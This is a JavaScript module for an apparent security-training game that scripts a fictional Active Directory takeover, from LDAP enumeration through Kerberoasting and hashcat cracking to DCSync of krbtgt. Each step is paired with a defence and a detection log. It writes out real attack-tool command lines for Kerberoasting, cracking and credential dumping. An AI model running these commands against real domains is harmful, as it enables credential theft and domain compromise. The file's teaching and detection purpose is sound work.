// Simulated engagement #2: the INTERNAL Active Directory phase of the Halcyon Mutual assessment.
// Picks up where the external pentest left off — the assessor has a low-privilege foothold (the svc_portal
// account) and a route onto the internal network through the compromised DMZ portal (192.0.2.15). From there
// this is the single most common way a real internal pentest reaches Domain Admin: a service account with a
// Service Principal Name (SPN) and a weak password is *Kerberoasted*, cracked offline, and turns out to be
// over-privileged (a member of Domain Admins), which is then used to DCSync the domain.
//
// Everything is fiction and canned, exactly like the external engagement: hosts use RFC 5737 documentation IP
// ranges and *.example names, commands are a fixed whitelist, every output is pre-written, nothing is executed
// and there are no payloads or real hashes. Tool names (BloodHound, GetUserSPNs, hashcat, secretsdump, nxc) are
// the industry-standard names used in the MITRE ATT&CK pages for these techniques — here they only print
// scripted output. Each step: id, tactic + tid/tname (ATT&CK), goal, defend, choices, and logs(b, t, ctx) that
// writes the blue-team trace into the SIEM keyed to the step.
import { PORTAL, FILES, CLAIMSDB, DC } from './halcyon-engagement.js';
import { adNoise, STAFF, T } from '../game/logkit.js';

// The assessor works through the DMZ portal they already own, so the domain controller sees the portal's
// internal address as the client of every Kerberos/LDAP request.
export const PIVOT = PORTAL.dmz; // 192.0.2.15
export const SVC_SQL = { sam: 'svc_sql', spn: `MSSQLSvc/${CLAIMSDB.name}:1433`, password: 'Summ3r!Claims2023' };
export const AD_FLAG = 'FLAG{spn-on-a-domain-admin}';

// A Saturday-afternoon internal window, the day after the external phase.
export const AD_DATE = { weekday: 'SAT', name: 'Saturday', month: 'Oct', day: 31, year: 2026, domain: 'halcyon.example', netbios: 'HALCYON' };

export const AD_ENGAGEMENT = {
  id: 'halcyon-ad-2026',
  name: 'Internal Active Directory',
  client: 'Halcyon Mutual',
  title: 'Internal AD takeover: Halcyon Mutual',
  blurb: 'From the foothold you already have, take over the Windows domain the real way: enumerate it, Kerberoast a service account, crack its weak password offline, find it is secretly a Domain Admin, and DCSync the domain. 5 moves, discovery → domain compromise.',
  seed: 6815,
  date: AD_DATE,
  attacker: { ip: PIVOT, host: 'assessor' },
  prompt: 'assessor@kali:~/halcyon-internal$',
  flag: AD_FLAG,
  noise: adEngagementNoise,
  summary: 'The one-line report: a SQL service account was both Kerberoastable (it had an SPN and still allowed RC4) and a Domain Admin, with a wordlist password. That single misconfiguration turned a low-privilege foothold into full domain compromise. Three fixes (a long/gMSA password, disable RC4, and take svc_sql out of Domain Admins) break the whole chain.',
  start: 13 * 3600 + 8 * 60, // 13:08, inside the agreed window
  roe: [
    'Authorised by Halcyon Mutual’s CISO as the internal phase of engagement halcyon-ext-2026. Simulated hosts only.',
    `Assumed start: the low-privilege svc_portal account from the external phase, routed onto the LAN through the compromised DMZ portal (${PIVOT}).`,
    `In scope: the halcyon.example Active Directory domain on 192.0.2.0/24 (dc01 at ${DC.ip}).`,
    'Objective: prove full domain compromise by reading the proof token the CISO planted on Active Directory. Nothing else.',
    'Out of scope: dumping every account’s password hashes, forging persistence (golden tickets), resetting real users’ passwords, denial of service.',
    'Stealth counts: the SOC watches the domain controller. Loud moves show up as alerts in the debrief.',
  ],
  steps: [
    {
      id: 'enum',
      tactic: 'Discovery',
      tid: 'T1087.002',
      tname: 'Account Discovery: Domain Account',
      goal: 'Map the domain from your foothold: who the accounts are, and which ones are worth attacking.',
      defend: 'Tier the admin model and keep service accounts out of Domain Admins; alert on bulk LDAP reads and BloodHound-style collection from a non-admin host.',
      choices: [
        {
          cmd: `nxc ldap ${DC.ip} -u svc_portal -p ****** --users --kerberoasting`,
          label: 'Targeted LDAP query: list users and who has an SPN (quiet)',
          output: [
            `LDAP        ${DC.ip}    389    DC01    [+] halcyon.example\\svc_portal (bind OK, low-priv domain user)`,
            `LDAP        ${DC.ip}    389    DC01    Enumerated 41 domain users`,
            'LDAP        -                       User            Groups                         SPN',
            'LDAP        -                       priya.r         Domain Users                   -',
            'LDAP        -                       j.alvarez       Domain Users, Claims-RW        -',
            'LDAP        -                       svc_backup      Domain Users                   -',
            `LDAP        -                       svc_sql         Domain Users, Domain Admins    ${SVC_SQL.spn}`,
            '[!] svc_sql has a Service Principal Name AND is in Domain Admins.',
            '[!] An account with an SPN can be Kerberoasted: anyone can request its ticket and crack it offline.',
          ],
        },
        {
          cmd: `bloodhound-python -u svc_portal -p ****** -d halcyon.example -c All -ns ${DC.ip}`,
          label: 'Full BloodHound collection of the whole directory (loud)',
          loud: true,
          output: [
            'INFO: BloodHound.py for halcyon.example',
            `INFO: Connecting to LDAP server: ${DC.ip}`,
            'INFO: Found 41 users, 12 groups, 6 computers',
            'INFO: Collected sessions, ACLs, SPNs, group membership (2,473 objects)',
            'INFO: Compressed output: 20261031_halcyon.zip',
            '[shortest path to Domain Admins]',
            '  svc_portal  --MemberOf-->  Domain Users',
            `  svc_sql     --HasSPN-->    ${SVC_SQL.spn}   --MemberOf-->  Domain Admins`,
            '# One account is both Kerberoastable and a Domain Admin. That is the whole path.',
            '# A full collection reads every object in the directory in seconds. The DC noticed.',
          ],
        },
      ],
      logs(b, t, { loud }) {
        b.add(t, DC.host, 'dirsvc', `dirsvc: ldap bind user=HALCYON\\svc_portal client=${PIVOT} result=success`, { ip: PIVOT, user: 'svc_portal', key: 'enum', attack: 'T1087.002' });
        b.add(t + 2, DC.host, 'dirsvc', `dirsvc: ldap client=${PIVOT} op=search base="DC=halcyon,DC=example" filter="(servicePrincipalName=*)" returned=3`, { ip: PIVOT, user: 'svc_portal', key: 'enum', attack: 'T1087.002' });
        if (loud) {
          b.add(t + 9, DC.host, 'dirsvc', `dirsvc: ldap client=${PIVOT} op=search scope=subtree filter="(objectClass=*)" returned=2473 objects duration=4180ms`, { ip: PIVOT, user: 'svc_portal', key: 'enum', attack: 'T1087.002', detection: 'IDS: bulk LDAP enumeration (BloodHound-style) of the whole directory from the DMZ' });
        }
      },
    },
    {
      id: 'roast',
      tactic: 'Credential Access',
      tid: 'T1558.003',
      tname: 'Steal or Forge Kerberos Tickets: Kerberoasting',
      goal: 'Get something crackable: request the service ticket for svc_sql’s SPN. The ticket is encrypted with the account’s password.',
      defend: 'Use long random passwords or group-managed service accounts (gMSA); disable RC4; alert on RC4 (0x17) service-ticket requests, especially many at once.',
      choices: [
        {
          cmd: `GetUserSPNs.py halcyon.example/svc_portal -dc-ip ${DC.ip} -request-user svc_sql`,
          label: 'Request just svc_sql’s ticket (quiet)',
          output: [
            'ServicePrincipalName                      Name     MemberOf        PasswordLastSet',
            `${SVC_SQL.spn}   svc_sql  Domain Admins   2023-05-14 09:11:02`,
            '',
            '[*] Requesting TGS for svc_sql (RC4 — the account still allows it)',
            `$krb5tgs$23$*svc_sql$HALCYON.EXAMPLE$${SVC_SQL.spn}*$a19f...` + '7c2e  (truncated — saved to svc_sql.tgs)',
            '# $krb5tgs$23$ = an RC4 (type 23) service ticket. It can be cracked offline, off the wire.',
          ],
        },
        {
          cmd: `GetUserSPNs.py halcyon.example/svc_portal -dc-ip ${DC.ip} -request`,
          label: 'Request every SPN’s ticket in one shot (loud)',
          loud: true,
          output: [
            '[*] Requesting TGS tickets for all service accounts with an SPN...',
            '  HTTP/portal.halcyon.example        svc_web    -> $krb5tgs$23$*svc_web$...',
            `  ${SVC_SQL.spn}   svc_sql    -> $krb5tgs$23$*svc_sql$...`,
            '  CIFS/files01.halcyon.example       svc_backup -> $krb5tgs$23$*svc_backup$...',
            '[*] 3 tickets saved. All RC4 (type 23).',
            '# Three RC4 ticket requests in two seconds, from one host. The DC logged every one.',
          ],
        },
      ],
      logs(b, t, { loud }) {
        b.win(t, DC.host, 4769, { user: 'svc_portal', service: SVC_SQL.spn, ip: PIVOT, enc: '0x17', port: 50144 }, { user: 'svc_portal', ip: PIVOT, key: 'roast', attack: 'T1558.003', detection: 'Rule: RC4 (0x17) Kerberos service ticket requested for an SPN — possible Kerberoasting' });
        if (loud) {
          ['HTTP/portal.halcyon.example', 'CIFS/files01.halcyon.example'].forEach((s, i) =>
            b.win(t + 2 + i, DC.host, 4769, { user: 'svc_portal', service: s, ip: PIVOT, enc: '0x17', port: 50150 + i }, { user: 'svc_portal', ip: PIVOT, key: 'roast', attack: 'T1558.003', detection: i === 0 ? 'Rule: several RC4 service tickets requested within seconds from one host — mass Kerberoasting' : undefined }));
        }
      },
    },
    {
      id: 'crack',
      tactic: 'Credential Access',
      tid: 'T1110.002',
      tname: 'Brute Force: Password Cracking',
      goal: 'Turn the ticket into a password. This happens on your own laptop — not on the network.',
      defend: 'The crack itself is offline and leaves no trace on the domain; the only defence is a password long enough that it never falls. Your first visible trace is the moment you use it.',
      choices: [
        {
          cmd: 'hashcat -m 13100 svc_sql.tgs rockyou.txt',
          label: 'Crack the RC4 ticket offline with a wordlist',
          output: [
            'hashcat (v6.2.6) starting',
            'Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)',
            'Recovered........: 1/1 (100.00%) Digests',
            '',
            `$krb5tgs$23$*svc_sql$HALCYON.EXAMPLE$...:${SVC_SQL.password}`,
            `# Cracked. svc_sql / ${SVC_SQL.password}  — a Domain Admin password, found on a wordlist.`,
            '# Nothing above touched Halcyon’s network. The SOC saw none of it.',
          ],
        },
      ],
      logs(b, t) {
        // Offline cracking leaves no domain log. The one trace is the assessor confirming the password works
        // by requesting a normal TGT as svc_sql — which looks ordinary, so it raises no alert.
        b.win(t, DC.host, 4768, { user: 'svc_sql', ip: PIVOT, enc: '0x12', port: 50210 }, { user: 'svc_sql', ip: PIVOT, key: 'crack', attack: 'T1110.002' });
      },
    },
    {
      id: 'elevate',
      tactic: 'Privilege Escalation',
      tid: 'T1078.002',
      tname: 'Valid Accounts: Domain Accounts',
      goal: 'Use the cracked password. Confirm what BloodHound promised: svc_sql is a Domain Admin.',
      defend: 'No interactive/admin logons for service accounts; a Domain Admin logging in from a DMZ host should page the SOC. Service accounts do not need to be Domain Admins — this one never did.',
      choices: [
        {
          cmd: `nxc smb ${DC.ip} -u svc_sql -p '${SVC_SQL.password}'`,
          label: 'Authenticate to the domain controller as svc_sql',
          prompt: 'assessor@kali:~/halcyon-internal# (DA)',
          output: [
            `SMB         ${DC.ip}    445    DC01    [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:halcyon.example)`,
            `SMB         ${DC.ip}    445    DC01    [+] halcyon.example\\svc_sql:${SVC_SQL.password} (Pwn3d!)`,
            '# (Pwn3d!) = this account is a local admin on the domain controller. svc_sql really is a Domain Admin.',
            '# A SQL service account with Domain Admin rights. It only ever needed to run one database.',
          ],
        },
      ],
      logs(b, t) {
        b.win(t, DC.host, 4624, { user: 'svc_sql', ip: PIVOT, ws: 'PORTAL01', type: 3, logonId: b.logonId() }, { user: 'svc_sql', ip: PIVOT, key: 'elevate', attack: 'T1078.002', detection: 'Rule: Domain Admin service account svc_sql authenticated to dc01 from the DMZ pivot' });
      },
    },
    {
      id: 'dcsync',
      tactic: 'Credential Access',
      tid: 'T1003.006',
      tname: 'OS Credential Dumping: DCSync',
      goal: 'Prove full domain compromise: use the Domain Admin rights to replicate a secret from the DC, and read the planted proof token. Nothing more.',
      defend: 'Restrict directory-replication rights (DS-Replication-Get-Changes) to real DCs; alert when any non-DC account requests replication — that is DCSync, and it is never normal.',
      objective: true,
      choices: [
        {
          cmd: 'secretsdump.py halcyon.example/svc_sql@192.0.2.5 -just-dc-user krbtgt',
          label: 'Replicate only the krbtgt secret (proof of full compromise)',
          output: [
            '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
            '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
            'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd6f...e03  (truncated)',
            '[*] Kerberos keys grabbed for krbtgt',
            'info (planted by CISO office for engagement halcyon-ad-2026):',
            `  Proof token: ${AD_FLAG}`,
            '# With the krbtgt hash you could forge a ticket for any user in the domain. Game over.',
            '# Objective reached. Stop here: do not dump the rest. Write it up.',
          ],
        },
        {
          cmd: 'secretsdump.py halcyon.example/svc_sql@192.0.2.5 -just-dc',
          label: 'Replicate every account’s password hashes',
          violation: true,
          output: [
            'STOPPED by the rules of engagement.',
            '-just-dc dumps the password hashes of every employee in the domain. That is mass credential theft,',
            'and it is out of scope: you have already proven full compromise with the krbtgt secret alone.',
            'Prove access; never take the data. Strike recorded.',
          ],
        },
      ],
      logs(b, t) {
        b.win(t, DC.host, 4662, { user: 'svc_sql', ip: PIVOT }, { user: 'svc_sql', ip: PIVOT, key: 'dcsync', attack: 'T1003.006', detection: 'Rule: DCSync — directory replication (DS-Replication-Get-Changes) requested by svc_sql, which is not a domain controller' });
      },
    },
  ],
};

/** Ordinary Active Directory traffic for the afternoon, so the attack has a haystack of normal tickets to hide in. */
export function adEngagementNoise(b, start, end) {
  const users = Object.entries(STAFF).slice(0, 6).map(([u, [ws, ip]], i) => [u, ws, ip, start - T(0, 40) + i * 53]);
  adNoise(b, { users, base: 0, end: end + 120 });
}
